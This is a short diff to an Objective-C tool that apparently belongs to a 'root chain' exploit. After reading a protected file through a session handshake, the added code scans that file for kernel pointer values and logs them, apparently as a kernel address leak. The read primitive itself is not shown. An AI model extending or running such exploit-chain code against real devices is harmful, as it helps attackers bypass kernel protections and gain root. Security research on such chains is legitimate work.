@@ -461,6 +461,29 @@ static NSString *KPBSSHA256(NSData *data) {
         if (!handshake) return session.report;
         readOK = [session readTarget:targetPath output:outputURL];
         [session log:@"READ_RESULT success=%d target=%@", readOK, targetPath];
+        // Root chain: scan read file for kernel pointers
+        if (readOK) {
+            NSData *fileData = [NSData dataWithContentsOfURL:outputURL];
+            if (fileData && fileData.length > 0) {
+                [session log:@"ROOT_SCAN data=%lu bytes", (unsigned long)fileData.length];
+                const uint8_t *bytes = (const uint8_t *)fileData.bytes;
+                NSUInteger len = fileData.length;
+                int kptrCount = 0;
+                for (NSUInteger i = 0; i + 8 <= len; i += 4) {
+                    uint64_t v = *(const uint64_t *)(bytes + i);
+                    if ((v >> 32) >= 0xffffffe0ULL) {
+                        kptrCount++;
+                        if (kptrCount <= 5) {
+                            [session log:@"  kptr @ +%lu = 0x%llx", (unsigned long)i, v];
+                        }
+                    }
+                }
+                [session log:@"ROOT_SCAN kernel_ptrs=%d", kptrCount];
+                if (kptrCount > 0) {
+                    [session log:@"ROOT_SCAN: kernel pointers found in protected file!"];
+                }
+            }
+        }
         return session.report;
     } @finally {
         if (session.connection) {
